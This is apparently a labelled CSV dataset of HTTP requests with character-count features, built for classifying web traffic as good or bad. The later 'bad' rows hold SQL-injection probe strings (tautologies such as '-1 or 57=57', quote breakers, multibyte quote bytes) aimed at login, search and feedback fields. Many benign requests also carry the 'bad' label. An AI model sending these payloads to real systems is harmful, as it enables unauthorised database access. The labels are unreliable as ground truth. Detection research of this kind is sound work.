,method,body,path,single_q,double_q,dashes,braces,spaces,badwords,class
51,GET,b'',b'/bxss/index.php',0,0,0,0,0,0,good
52,GET,b'',b'/bxss/cleanDatabase.php',0,0,0,0,0,0,good
53,GET,b'',b'/bxss/vuln.php',0,0,0,0,0,0,good
54,GET,b'',b'/bxss/test.js',0,0,0,0,0,0,good
55,GET,b'',b'/bxss/database_connect.php',0,0,0,0,0,0,good
56,GET,b'',b'/bxss/adminPan3l/index.php',0,0,0,0,0,0,good
57,GET,b'',b'/admin/create.sql',0,0,0,0,0,0,good
58,GET,b'',b'/adm1nPan3l/index.php',0,0,0,0,0,0,good
59,GET,b'',b'/_mmServerScripts/mysql.php',0,0,0,0,0,0,good
60,GET,b'',b'/_mmServerScripts/MMHTTPDB.php',0,0,0,0,0,0,good
61,GET,b'',b'/Templates/main_dynamic_template.dwt.php',0,0,0,0,0,0,good
62,GET,b'',b'/Mod_Rewrite_Shop/details.php',0,0,0,0,0,0,good
63,GET,b'',b'/Mod_Rewrite_Shop/index.php',0,0,0,0,0,0,good
64,GET,b'',b'/Mod_Rewrite_Shop/buy.php',0,0,0,0,0,0,good
65,GET,b'',b'/Mod_Rewrite_Shop/rate.php',0,0,0,0,0,0,good
66,GET,b'',b'/Mod_Rewrite_Shop/.htaccess',0,0,0,0,0,0,good
67,GET,b'',b'/Connections/DB_Connection.php',0,0,0,0,0,0,good
68,GET,b'',b'/CVS/Repository',0,0,0,0,0,0,good
69,GET,b'',b'/AJAX/infoartist.php',0,0,0,0,0,0,good
70,GET,b'',b'/AJAX/artists.php',0,0,0,0,0,0,good
71,GET,b'',b'/AJAX/titles.php',0,0,0,0,0,0,good
72,GET,b'',b'/AJAX/showxml.php',0,0,0,0,0,0,good
73,GET,b'',b'/AJAX/categories.php',0,0,0,0,0,0,good
74,GET,b'',b'/AJAX/infocateg.php',0,0,0,0,0,0,good
75,GET,b'',b'/AJAX/infotitle.php',0,0,0,0,0,0,good
76,GET,b'',b'/.idea/workspace.xml',0,0,0,0,0,0,good
77,GET,b'',b'/AJAX/htaccess.conf',0,0,0,0,0,0,good
78,GET,b'',b'/.idea/vcs.xml',0,0,0,0,0,0,good
79,GET,b'',b'/.idea/modules.xml',0,0,0,0,0,0,good
80,GET,b'',b'/.idea/encodings.xml',0,0,0,0,0,0,good
81,GET,b'',b'/.idea/misc.xml',0,0,0,0,0,0,good
82,GET,b'',b'/.idea/.name',0,0,0,0,0,0,good
83,GET,b'',b'/.idea/acuart.iml',0,0,0,0,0,0,good
84,GET,b'',b'/.idea/scopes/scope_settings.xml',0,0,0,0,0,0,good
85,GET,b'',b'/AJAX',0,0,0,0,0,0,good
86,GET,b'',b'/images',0,0,0,0,0,0,good
87,GET,b'',b'/Flash',0,0,0,0,0,0,good
88,GET,b'',b'/wvstests',0,0,0,0,0,0,good
89,GET,b'',b'/wvstests/pmwiki_2_1_19',0,0,0,0,0,0,good
90,GET,b'',b'/wvstests/pmwiki_2_1_19/scripts',0,0,0,0,0,0,good
91,GET,b'',b'/vendor',0,0,0,0,0,0,good
92,GET,b'',b'/secured',0,0,0,0,0,0,good
93,GET,b'',b'/pictures',0,0,0,0,0,0,good
94,GET,b'',b'/bxss',0,0,0,0,0,0,good
95,GET,b'',b'/bxss/adminPan3l',0,0,0,0,0,0,good
96,GET,b'',b'/admin',0,0,0,0,0,0,good
97,GET,b'',b'/adm1nPan3l',0,0,0,0,0,0,good
98,GET,b'',b'/_mmServerScripts',0,0,0,0,0,0,good
99,GET,b'',b'/Templates',0,0,0,0,0,0,good
100,GET,b'',b'/Mod_Rewrite_Shop/images',0,0,0,0,0,0,good
101,GET,b'',b'/Connections',0,0,0,0,0,0,good
102,GET,b'',b'/CVS',0,0,0,0,0,0,good
103,GET,b'',b'/.idea',0,0,0,0,0,0,good
104,GET,b'',b'/.idea/scopes',0,0,0,0,0,0,good
105,GET,b'',b'/sitemap.xml',0,0,0,0,0,0,good
106,POST,b'pass=acUn3t1x&uname=htxxwdue',b'/userinfo.php',0,0,0,0,0,0,good
107,GET,b'',b'/sitemap.xml.gz',0,0,0,0,0,0,good
108,POST,b'name=anonymous%20user&submit=add%20message&text=1',b'/guestbook.php',0,0,0,0,2,0,good
109,GET,b'',b'/Mod_Rewrite_Shop/',0,0,0,0,0,0,good
110,GET,b'',b'/hpp/',0,0,0,0,0,0,good
111,GET,b'',b'/artists.php?artist=2',0,0,0,0,0,0,good
112,GET,b'',b'/artists.php?artist=3',0,0,0,0,0,0,good
113,GET,b'',b'/listproducts.php?cat=3',0,0,0,0,0,0,good
114,GET,b'',b'/listproducts.php?cat=4',0,0,0,0,0,0,good
115,GET,b'',b'/listproducts.php?cat=1',0,0,0,0,0,0,good
116,POST,b'signup=signup&uaddress=3137%20Laguna%20Street&ucc=4111111111111111&uemail=sample%40email.tst&upass=acUn3t1x&upass2=acUn3t1x&uphone=555-666-0606&urname=txgcsqdc&uuname=abkfulto',b'/secured/newuser.php',0,0,0,0,2,0,good
117,POST,b'comment=1&name=%3cyour%20name%20here%3e&phpaction=echo%20%24_POST%5bcomment%5d%3b&Submit=Submit',b'/comment.php',0,0,0,0,3,0,good
118,GET,b'',b'/redir.php?r=http://www.eclectasy.com/Fractal-Explorer/index.html',0,0,0,0,0,0,good
119,GET,b'',b'/secured/phpinfo.php?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000',0,0,0,0,0,0,good
120,GET,b'',b'/secured/phpinfo.php?=PHPE9568F35-D428-11d2-A769-00AA001ACF42',0,0,0,0,0,0,good
121,GET,b'',b'/secured/phpinfo.php?=PHPE9568F34-D428-11d2-A769-00AA001ACF42',0,0,0,0,0,0,good
122,GET,b'',b'/secured/office_files/filelist.xml',0,0,0,0,0,0,good
123,GET,b'',b'/secured/office_files',0,0,0,0,0,0,good
124,GET,b'',b'/medias/css/main.css',0,0,0,0,0,0,good
125,GET,b'',b'/medias/js/common_functions.js',0,0,0,0,0,0,good
126,GET,b'',b'/medias',0,0,0,0,0,0,good
127,GET,b'',b'/medias/css',0,0,0,0,0,0,good
128,GET,b'',b'/medias/img',0,0,0,0,0,0,good
129,GET,b'',b'/medias/js',0,0,0,0,0,0,good
130,GET,b'',b'/hpp/index.php?pp=12',0,0,0,0,0,0,good
131,GET,b'',b'/bxss/vuln.php?id=1',0,0,0,0,0,0,good
132,GET,b'',b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2',0,0,0,0,0,0,good
133,GET,b'',b'/Mod_Rewrite_Shop/Details/color-printer/3',0,0,0,0,0,0,good
134,GET,b'',b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1',0,0,0,0,0,0,good
135,GET,b'',b'/Mod_Rewrite_Shop/Details',0,0,0,0,0,0,good
136,GET,b'',b'/Mod_Rewrite_Shop/Details/color-printer',0,0,0,0,0,0,good
137,GET,b'',b'/Mod_Rewrite_Shop/Details/web-camera-a4tech',0,0,0,0,0,0,good
138,GET,b'',b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink',0,0,0,0,0,0,good
139,GET,b'',b'/AJAX/',0,0,0,0,0,0,good
140,GET,b'',b'/images/',0,0,0,0,0,0,good
141,GET,b'',b'/Flash/',0,0,0,0,0,0,good
142,GET,b'',b'/wvstests/',0,0,0,0,0,0,good
143,GET,b'',b'/wvstests/pmwiki_2_1_19/',0,0,0,0,0,0,good
144,GET,b'',b'/vendor/',0,0,0,0,0,0,good
145,GET,b'',b'/secured/',0,0,0,0,0,0,good
146,GET,b'',b'/wvstests/pmwiki_2_1_19/scripts/',0,0,0,0,0,0,good
147,GET,b'',b'/pictures/',0,0,0,0,0,0,good
148,GET,b'',b'/bxss/',0,0,0,0,0,0,good
149,GET,b'',b'/bxss/adminPan3l/',0,0,0,0,0,0,good
150,GET,b'',b'/admin/',0,0,0,0,0,0,good
151,GET,b'',b'/adm1nPan3l/',0,0,0,0,0,0,good
152,GET,b'',b'/_mmServerScripts/',0,0,0,0,0,0,good
153,GET,b'',b'/Mod_Rewrite_Shop/images/',0,0,0,0,0,0,good
154,GET,b'',b'/Templates/',0,0,0,0,0,0,good
155,GET,b'',b'/Connections/',0,0,0,0,0,0,good
156,GET,b'',b'/.idea/',0,0,0,0,0,0,good
157,GET,b'',b'/.idea/scopes/',0,0,0,0,0,0,good
158,GET,b'',b'/CVS/',0,0,0,0,0,0,good
159,GET,b'',b'/hpp/?pp=12',0,0,0,0,0,0,good
160,GET,b'',b'/product.php?pic=4',0,0,0,0,0,0,good
161,GET,b'',b'/listproducts.php?artist=3',0,0,0,0,0,0,good
162,GET,b'',b'/product.php?pic=1',0,0,0,0,0,0,good
163,GET,b'',b'/listproducts.php?artist=2',0,0,0,0,0,0,good
164,GET,b'',b'/hpp/params.php?aaaa%2f=1',0,0,0,0,0,0,good
165,GET,b'',b'/hpp/params.php?p=valid&pp=12',0,0,0,0,0,0,good
166,GET,b'',b'/Mod_Rewrite_Shop/Details/web-camera-a4tech/2/',0,0,0,0,0,0,good
167,GET,b'',b'/Mod_Rewrite_Shop/Details/network-attached-storage-dlink/1/',0,0,0,0,0,0,good
168,GET,b'',b'/Mod_Rewrite_Shop/Details/color-printer/3/',0,0,0,0,0,0,good
169,POST,b'addcart=1&price=500',b'/cart.php',0,0,0,0,0,0,good
170,POST,b'addcart=4&price=1000',b'/cart.php',0,0,0,0,0,0,good
171,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-2',0,0,0,0,0,0,good
172,GET,b'',b'/Mod_Rewrite_Shop/RateProduct-1.html',0,0,0,0,0,0,good
173,GET,b'',b'/Mod_Rewrite_Shop/RateProduct-2.html',0,0,0,0,0,0,good
174,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-1',0,0,0,0,0,0,good
175,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-3',0,0,0,0,0,0,good
176,GET,b'',b'/Mod_Rewrite_Shop/RateProduct-3.html',0,0,0,0,0,0,good
177,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-1/',0,0,0,0,0,0,good
178,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-2/',0,0,0,0,0,0,good
179,GET,b'',b'/Mod_Rewrite_Shop/BuyProduct-3/',0,0,0,0,0,0,good
180,POST,"b'<xml><node name=""nodename1"">nodetext1</node><node name=""nodename2"">nodetext2</node></xml>'",b'/AJAX/showxml.php',0,4,0,0,2,0,good
181,GET,b'',b'/comment.php?aid=2',0,0,0,0,0,0,good
182,GET,b'',b'/comment.php?pid=4',0,0,0,0,0,0,good
183,GET,b'',b'/comment.php?aid=3',0,0,0,0,0,0,good
184,GET,b'',b'/comment.php?pid=7',0,0,0,0,0,0,good
185,GET,b'',b'/comment.php?pid=5',0,0,0,0,0,0,good
186,GET,b'',b'/',0,0,0,0,0,0,good
187,GET,b'',b'/',0,0,0,0,0,0,good
0,GET,b'',b'/',0,0,0,0,0,0,bad
1,GET,b'',b'/acunetix-wvs-test-for-some-inexistent-file',0,0,0,0,0,0,bad
2,GET,b'',b'/',0,0,0,0,0,0,bad
3,GET,b'',b'/HFr4xiA0',0,0,0,0,0,0,bad
4,GET,b'',b'/MXJu959I',0,0,0,0,0,0,bad
5,GET,b'',b'/TxOI7frH',0,0,0,0,0,0,bad
6,GET,b'',b'/',0,0,0,0,0,0,bad
7,GET,b'',b'/favicon.ico',0,0,0,0,0,0,bad
8,GET,b'',b'/search.jsp',0,0,0,0,0,0,bad
9,GET,b'',b'/robots.txt',0,0,0,0,0,0,bad
10,GET,b'',b'/search.jsp?query=1',0,0,0,0,0,0,bad
11,GET,b'',b'/index.jsp?content=business_deposit.htm',0,0,0,0,0,0,bad
12,GET,b'',b'/index.jsp?content=business_retirement.htm',0,0,0,0,0,0,bad
13,GET,b'',b'/index.jsp?content=business_other.htm',0,0,0,0,0,0,bad
14,GET,b'',b'/index.jsp?content=inside.htm',0,0,0,0,0,0,bad
15,GET,b'',b'/index.jsp',0,0,0,0,0,0,bad
16,GET,b'',b'/index.jsp?content=inside_about.htm',0,0,0,0,0,0,bad
17,GET,b'',b'/index.jsp?content=business.htm',0,0,0,0,0,0,bad
18,GET,b'',b'/index.jsp?content=business_lending.htm',0,0,0,0,0,0,bad
19,GET,b'',b'/index.jsp?content=business_insurance.htm',0,0,0,0,0,0,bad
20,GET,b'',b'/index.jsp?content=personal_loans.htm',0,0,0,0,0,0,bad
21,GET,b'',b'/index.jsp?content=business_cards.htm',0,0,0,0,0,0,bad
22,GET,b'',b'/login.jsp',0,0,0,0,0,0,bad
23,GET,b'',b'/subscribe.jsp',0,0,0,0,0,0,bad
24,GET,b'',b'/default.jsp',0,0,0,0,0,0,bad
25,GET,b'',b'/default.jsp?content=security.htm',0,0,0,0,0,0,bad
26,GET,b'',b'/feedback.jsp',0,0,0,0,0,0,bad
27,GET,b'',b'/survey_questions.jsp',0,0,0,0,0,0,bad
28,GET,b'',b'/status_check.jsp',0,0,0,0,0,0,bad
29,GET,b'',b'/swagger/index.html',0,0,0,0,0,0,bad
30,GET,b'',b'/images',0,0,0,0,0,0,bad
31,GET,b'',b'/swagger',0,0,0,0,0,0,bad
32,GET,b'',b'/sitemap.xml.gz',0,0,0,0,0,0,bad
33,GET,b'',b'/sitemap.xml',0,0,0,0,0,0,bad
34,GET,b'',b'/high_yield_investments.htm',0,0,0,0,0,0,bad
35,GET,b'',b'/retirement.htm',0,0,0,0,0,0,bad
36,GET,b'',b'/pr',0,0,0,0,0,0,bad
37,GET,b'',b'/inside_points_of_interest.htm',0,0,0,0,0,0,bad
38,GET,b'',b'/my%20documents/JohnSmith/Bank%20Site%20Documents/grouplife.htm',0,0,0,0,3,0,bad
39,GET,b'',b'/my%20documents/JohnSmith/Bank%20Site%20Documents',0,0,0,0,3,0,bad
40,GET,b'',b'/my%20documents/JohnSmith',0,0,0,0,1,0,bad
41,GET,b'',b'/my%20documents',0,0,0,0,1,0,bad
42,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
43,GET,b'',b'/doLogin',0,0,0,0,0,0,bad
44,GET,b'',b'/doSubscribe',0,0,0,0,0,0,bad
45,POST,b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
46,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=qeoavhkm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
47,GET,b'',b'/survey_questions.jsp?step=a',0,0,0,0,0,0,bad
48,GET,b'',b'/sendFeedback',0,0,0,0,0,0,bad
49,GET,b'',b'/swagger/swagger-ui-bundle.js',0,0,0,0,0,0,bad
50,GET,b'',b'/swagger/swagger-ui-standalone-preset.js',0,0,0,0,0,0,bad
51,GET,b'',b'/images/',0,0,0,0,0,0,bad
52,GET,b'',b'/swagger/',0,0,0,0,0,0,bad
53,GET,b'',b'/security.htm',0,0,0,0,0,0,bad
54,GET,b'',b'/pr/',0,0,0,0,0,0,bad
55,GET,b'',b'/survey_questions.jsp?step=b',0,0,0,0,0,0,bad
56,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
57,GET,b'',b'/util/serverStatusCheckService.jsp?HostName=AltoroMutual',0,0,0,0,0,0,bad
58,GET,b'',b'/util',0,0,0,0,0,0,bad
59,GET,b'',b'/util/',0,0,0,0,0,0,bad
60,GET,b'',b'/',0,0,0,0,0,0,bad
61,GET,b'',b'/',0,0,0,0,0,0,bad
62,POST,b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
63,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
64,POST,b'cfile=comments.txt&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
65,POST,b'btnSubmit=Subscribe&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
66,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
67,POST,b'btnSubmit=Login&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
68,GET,b'',b'/high_yield_investments.htm',0,0,0,0,0,0,bad
69,GET,b'',b'/search.jsp?query=1',0,0,0,0,0,0,bad
70,GET,b'',b'/high_yield_investments.htm',0,0,0,0,0,0,bad
71,GET,b'',b'/search.jsp?query=1',0,0,0,0,0,0,bad
72,POST,b'btnSubmit=1%27%22&txtEmail=sample%40email.tst',b'/doSubscribe',1,1,0,0,0,0,bad
73,GET,b'',b'/1%27%22.htm',1,1,0,0,0,0,bad
74,POST,b'btnSubmit=1%27%22&passw=acUn3t1x&uid=1',b'/doLogin',1,1,0,0,0,1,bad
75,POST,b'cfile=1%27%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
76,GET,b'',b'/search.jsp?query=1%27%22',1,1,0,0,0,0,bad
77,POST,b'btnSubmit=%5c&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
78,GET,b'',b'/-1%20or%2057%3d57.htm',0,0,0,0,2,0,bad
79,POST,b'btnSubmit=-1%20or%20108%3d108&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,2,0,bad
80,GET,b'',b'/%5c.htm',0,0,0,0,0,0,bad
81,POST,b'cfile=-1%20or%2089%3d89&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
82,POST,b'cfile=%5c&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
83,POST,b'btnSubmit=-1%20or%20103%3d103&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,2,1,bad
84,POST,b'btnSubmit=%5c&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
85,GET,b'',b'/search.jsp?query=%5c',0,0,0,0,0,0,bad
86,POST,b'btnSubmit=-1%20or%20108%3d0&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,2,0,bad
87,POST,b'cfile=-1%20or%2089%3d0&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,4,0,bad
88,POST,b'btnSubmit=1%c0%00xa7%c0%a2&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
89,POST,b'cfile=1%c0%00xa7%c0%a2&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
90,GET,b'',b'/-1%20or%2057%3d0.htm',0,0,0,0,2,0,bad
91,GET,b'',b'/1%c0%00xa7%c0%a2.htm',0,0,0,0,0,0,bad
92,POST,b'btnSubmit=1%c0%00xa7%c0%a2&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
93,GET,b'',b'/search.jsp?query=1%c0%00xa7%c0%a2',0,0,0,0,0,0,bad
94,POST,b'btnSubmit=-1%20or%20103%3d0&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,2,1,bad
95,GET,b'',b'/search.jsp?query=-1%20or%2084%3d84',0,0,0,0,2,0,bad
96,POST,b'cfile=%40%40JDhrK&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
97,POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%27102&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
98,GET,b'',b'/%40%40b5MGP.htm',0,0,0,0,0,0,bad
99,POST,b'cfile=-1%27%20or%20%2724%27%3d%2724&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
100,GET,b'',b'/-1%27%20or%20%2756%27%3d%2756.htm',4,0,0,0,2,0,bad
101,POST,b'btnSubmit=%40%40GLO1K&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
102,POST,b'btnSubmit=%40%40mePlV&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
103,GET,b'',b'/search.jsp?query=-1%20or%2084%3d0',0,0,0,0,2,0,bad
104,GET,b'',b'/search.jsp?query=%40%40UgYQX',0,0,0,0,0,0,bad
105,POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%27103&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
106,POST,b'cfile=JyI%3d&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',0,0,0,0,2,0,bad
107,POST,b'btnSubmit=JyI%3d&txtEmail=sample%40email.tst',b'/doSubscribe',0,0,0,0,0,0,bad
108,POST,b'btnSubmit=-1%27%20or%20%27102%27%3d%270&txtEmail=sample%40email.tst',b'/doSubscribe',4,0,0,0,2,0,bad
109,GET,b'',b'/-1%27%20or%20%2756%27%3d%270.htm',4,0,0,0,2,0,bad
110,GET,b'',b'/JyI%3d.htm',0,0,0,0,0,0,bad
111,POST,b'cfile=-1%27%20or%20%2724%27%3d%270&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',4,0,0,0,4,0,bad
112,GET,b'',b'/search.jsp?query=-1%20or%2084-82%20%3d%202',0,0,0,0,4,0,bad
113,GET,b'',b'/search.jsp?query=JyI%3d',0,0,0,0,0,0,bad
114,POST,b'btnSubmit=JyI%3d&passw=acUn3t1x&uid=1',b'/doLogin',0,0,0,0,0,1,bad
115,POST,b'btnSubmit=-1%27%20or%20%27103%27%3d%270&passw=acUn3t1x&uid=1',b'/doLogin',4,0,0,0,2,1,bad
116,GET,b'',b'/-1%22%20or%20%2269%22%3d%2269.htm',0,4,0,0,2,0,bad
117,POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%2239&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
118,POST,b'btnSubmit=%bf%27%bf%22&txtEmail=sample%40email.tst',b'/doSubscribe',1,1,0,0,0,0,bad
119,POST,b'cfile=%bf%27%bf%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',1,1,0,0,2,0,bad
120,GET,b'',b'/%bf%27%bf%22.htm',1,1,0,0,0,0,bad
121,POST,b'cfile=-1%22%20or%20%2287%22%3d%2287&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
122,GET,b'',b'/search.jsp?query=%bf%27%bf%22',1,1,0,0,0,0,bad
123,GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%2774',4,0,0,0,2,0,bad
124,POST,b'btnSubmit=%bf%27%bf%22&passw=acUn3t1x&uid=1',b'/doLogin',1,1,0,0,0,1,bad
125,POST,b'btnSubmit=-1%22%20or%20%2211%22%3d%2211&passw=acUn3t1x&uid=1',b'/doLogin',0,4,0,0,2,1,bad
126,POST,b'cfile=%f0%27%27%f0%22%22&comments=1&email_addr=3137%20Laguna%20Street&name=kekbdvgm&subject=1&submit=Submit',b'/sendFeedback',2,2,0,0,2,0,bad
127,POST,b'btnSubmit=-1%22%20or%20%2239%22%3d%220&txtEmail=sample%40email.tst',b'/doSubscribe',0,4,0,0,2,0,bad
128,POST,b'btnSubmit=%f0%27%27%f0%22%22&txtEmail=sample%40email.tst',b'/doSubscribe',2,2,0,0,0,0,bad
129,GET,b'',b'/%f0%27%27%f0%22%22.htm',2,2,0,0,0,0,bad
130,GET,b'',b'/-1%22%20or%20%2269%22%3d%220.htm',0,4,0,0,2,0,bad
131,POST,b'cfile=-1%22%20or%20%2287%22%3d%220&comments=1&email_addr=3137%20Laguna%20Street&name=qjhotncw&subject=1&submit=Submit',b'/sendFeedback',0,4,0,0,4,0,bad
132,GET,b'',b'/search.jsp?query=-1%27%20or%20%2774%27%3d%270',4,0,0,0,2,0,bad
